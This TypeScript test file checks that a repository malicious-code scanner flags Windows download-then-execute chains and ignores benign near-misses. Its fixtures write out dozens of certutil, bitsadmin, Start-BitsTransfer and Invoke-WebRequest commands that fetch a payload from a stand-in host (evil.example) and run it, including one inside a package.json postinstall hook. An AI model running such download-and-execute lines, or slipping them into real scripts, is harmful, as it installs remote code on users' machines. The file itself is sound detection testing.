import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. The Windows downloaders (certutil -urlcache, bitsadmin
 * /transfer, Start-BitsTransfer, Invoke-WebRequest -OutFile) were
 * already collected as downloads, but saving one to a path and running
 * that path later in the same file linked nothing: the staged rule's
 * path alphabet has no backslash, drive colon or environment root, so
 * a Windows path never matches it. The staged forms below are flagged
 * only because the execution names the exact path the download wrote.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const STAGED: Record<string, [string, string]> = {
  "certutil -urlcache, run directly": [
    "install.bat",
    "certutil -urlcache -f https://evil.example/x.exe C:\\Users\\Public\\x.exe\r\nC:\\Users\\Public\\x.exe\r\n",
  ],
  "certutil -urlcache -split, run with start": [
    "setup.cmd",
    "certutil.exe -urlcache -split -f https://evil.example/x.exe %TEMP%\\x.exe\r\nstart %TEMP%\\x.exe\r\n",
  ],
  "certutil -urlcache, run with wscript": [
    "install.bat",
    "certutil -urlcache -f https://evil.example/x.vbs C:\\Temp\\x.vbs\r\nwscript C:\\Temp\\x.vbs\r\n",
  ],
  "certutil uppercase spelling, run directly": [
    "install.bat",
    "CERTUTIL -URLCACHE -F https://evil.example/x.exe C:\\Temp\\x.exe\r\nC:\\TEMP\\X.EXE\r\n",
  ],
  "bitsadmin /transfer, run directly": [
    "install.bat",
    "bitsadmin /transfer job1 https://evil.example/x.exe C:\\Temp\\x.exe\r\nC:\\Temp\\x.exe /quiet\r\n",
  ],
  "bitsadmin /transfer, run with call": [
    "install.bat",
    "bitsadmin /transfer job1 https://evil.example/x.bat C:\\Temp\\x.bat\r\ncall C:\\Temp\\x.bat\r\n",
  ],
  "Start-BitsTransfer, run with the & operator": [
    "install.ps1",
    "Start-BitsTransfer -Source https://evil.example/x.ps1 -Destination $env:TEMP\\x.ps1\n& $env:TEMP\\x.ps1\n",
  ],
  "Start-BitsTransfer destination first, run with powershell -File": [
    "setup.ps1",
    "Start-BitsTransfer -Destination C:\\Temp\\x.ps1 -Source https://evil.example/x.ps1\npowershell -File C:\\Temp\\x.ps1\n",
  ],
  "Invoke-WebRequest -OutFile, run as .\\": [
    "install.ps1",
    "Invoke-WebRequest -Uri https://evil.example/x.exe -OutFile .\\x.exe\n.\\x.exe\n",
  ],
  "iwr with a positional URL, run with cmd /c": [
    "install.ps1",
    "iwr https://evil.example/x.bat -OutFile C:\\Temp\\x.bat\ncmd /c C:\\Temp\\x.bat\n",
  ],
  "Invoke-RestMethod -OutFile, run with the & operator": [
    "install.ps1",
    "Invoke-RestMethod -Uri https://evil.example/x.exe -OutFile $env:TEMP\\x.exe\n& $env:TEMP\\x.exe\n",
  ],
  "braced environment root, run with the & operator": [
    "install.ps1",
    "Invoke-WebRequest -Uri https://evil.example/x.ps1 -OutFile \u0024{env:TEMP}\\x.ps1\n& \u0024{env:TEMP}\\x.ps1\n",
  ],
  "quoted download path, quoted execution": [
    "install.bat",
    'certutil -urlcache -f https://evil.example/x.exe "C:\\Temp\\x.exe"\r\n"C:\\Temp\\x.exe"\r\n',
  ],
  "download and execution chained with &&": [
    "install.bat",
    "certutil -urlcache -f https://evil.example/x.exe C:\\Temp\\x.exe && C:\\Temp\\x.exe\r\n",
  ],
  "bare filename staged, run after cmd /c": [
    "install.bat",
    "certutil -urlcache -f https://evil.example/x.bat x.bat\r\ncmd /c x.bat\r\n",
  ],
};

test("a Windows download staged to a path and run later in the same file is unsafe execution", () => {
  for (const [name, [path, body]] of Object.entries(STAGED)) {
    expect({ name, findings: categories(inspected(path, body)) }).toEqual({
      name,
      findings: [`${path}:unsafe-execution:high`],
    });
  }
});

test("a Windows staged download executed in an install hook is install content", () => {
  const inspection = inspected(
    "package.json",
    '{"scripts":{"postinstall":"certutil -urlcache -f https://evil.example/x.exe %TEMP%\\\\x.exe && %TEMP%\\\\x.exe"}}\n',
  );
  // The extracted hook is executable content; the JSON wrapper is data.
  expect(categories(inspection)).toEqual([
    "package.json#scripts:unsafe-execution:high",
  ]);
});

test("a Windows staged download that is not executed keeps no finding", () => {
  for (const [path, body] of [
    // Verified against a checksum and nothing more.
    [
      "install.bat",
      "certutil -urlcache -f https://example.com/x.exe C:\\Temp\\x.exe\r\ncertutil -hashfile C:\\Temp\\x.exe SHA256\r\n",
    ],
    // A script artifact that is only read.
    [
      "install.ps1",
      "Invoke-WebRequest -Uri https://example.com/x.ps1 -OutFile $env:TEMP\\x.ps1\nGet-Content $env:TEMP\\x.ps1\n",
    ],
    // Downloading alone runs nothing.
    [
      "install.bat",
      "bitsadmin /transfer job1 https://example.com/x.exe C:\\Temp\\x.exe\r\necho downloaded\r\n",
    ],
    // The path is only mentioned, inside echo text.
    [
      "install.bat",
      "certutil -urlcache -f https://example.com/x.exe C:\\Temp\\x.exe\r\necho saved to C:\\Temp\\x.exe\r\n",
    ],
    // A data file that is only read.
    [
      "install.ps1",
      "iwr https://example.com/data.json -OutFile data.json\nGet-Content data.json\n",
    ],
  ] as const) {
    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
      path,
      findings: [],
    });
  }
});

test("an execution the Windows download does not stage keeps no finding", () => {
  for (const [path, body] of [
    // A pre-existing local tool runs; there is no download.
    ["install.bat", "C:\\Tools\\setup.exe /quiet\r\n"],
    // Downloaded to one path, a different path runs.
    [
      "install.ps1",
      "Invoke-WebRequest -Uri https://evil.example/x.exe -OutFile $env:TEMP\\x.exe\n& $env:TEMP\\y.exe\n",
    ],
    // The execution comes first; only a later execution would link.
    [
      "install.ps1",
      "& $env:TEMP\\x.exe\nInvoke-WebRequest -Uri https://evil.example/x.exe -OutFile $env:TEMP\\x.exe\n",
    ],
    // certutil -decode transforms a local file; it downloads nothing.
    [
      "install.bat",
      "certutil -decode payload.b64 C:\\Temp\\x.exe\r\nC:\\Temp\\x.exe\r\n",
    ],
    // A BITS upload sends a local file away; it stages nothing.
    [
      "install.ps1",
      "Start-BitsTransfer -Source C:\\Temp\\x.exe -Destination https://example.com/up -TransferType Upload\n& C:\\Temp\\x.exe\n",
    ],
    // A variable path is not one literal token.
    [
      "install.ps1",
      "Invoke-WebRequest -Uri https://evil.example/x.exe -OutFile $file\n& $file\n",
    ],
  ] as const) {
    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
      path,
      findings: [],
    });
  }
});

test("a staged path containing spaces stays out, quoted or not", () => {
  for (const [path, body] of [
    // The reviewer's reproduction: quoted on both sides.
    [
      "install.bat",
      'certutil -urlcache -f https://evil.example/x.exe "C:\\My Dir\\x.exe"\r\n"C:\\My Dir\\x.exe"\r\n',
    ],
    // Quoted download, unquoted execution.
    [
      "install.bat",
      'certutil -urlcache -f https://evil.example/x.exe "C:\\My Dir\\x.exe"\r\nC:\\My Dir\\x.exe\r\n',
    ],
    // Unquoted download, quoted execution.
    [
      "install.bat",
      'certutil -urlcache -f https://evil.example/x.exe C:\\My Dir\\x.exe\r\n"C:\\My Dir\\x.exe"\r\n',
    ],
    // Unquoted on both sides.
    [
      "install.bat",
      "certutil -urlcache -f https://evil.example/x.exe C:\\My Dir\\x.exe\r\nC:\\My Dir\\x.exe\r\n",
    ],
    // The other download branches stage spaced paths the same way.
    [
      "install.bat",
      'bitsadmin /transfer job1 https://evil.example/x.exe "C:\\My Dir\\x.exe"\r\n"C:\\My Dir\\x.exe"\r\n',
    ],
    [
      "install.ps1",
      'Start-BitsTransfer -Source https://evil.example/x.ps1 -Destination "C:\\My Dir\\x.ps1"\n& "C:\\My Dir\\x.ps1"\n',
    ],
    [
      "install.ps1",
      'Invoke-WebRequest -Uri https://evil.example/x.exe -OutFile "C:\\My Dir\\x.exe"\n& "C:\\My Dir\\x.exe"\n',
    ],
    // An environment-rooted spaced path, the benign installer shape.
    [
      "install.bat",
      'certutil -urlcache -f https://example.com/tool.exe "%USERPROFILE%\\My Documents\\tool.exe"\r\n"%USERPROFILE%\\My Documents\\tool.exe"\r\n',
    ],
  ] as const) {
    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
      path,
      findings: [],
    });
  }
});

test("a Windows download in one file and an execution in another stay unlinked", () => {
  const inspection = inspectRepository({
    files: [
      {
        path: "install.bat",
        bytes: new TextEncoder().encode(
          "certutil -urlcache -f https://evil.example/x.exe C:\\Temp\\x.exe\r\n",
        ),
      },
      {
        path: "setup.bat",
        bytes: new TextEncoder().encode("C:\\Temp\\x.exe\r\n"),
      },
    ],
  });
  expect(categories(inspection)).toEqual([]);
});
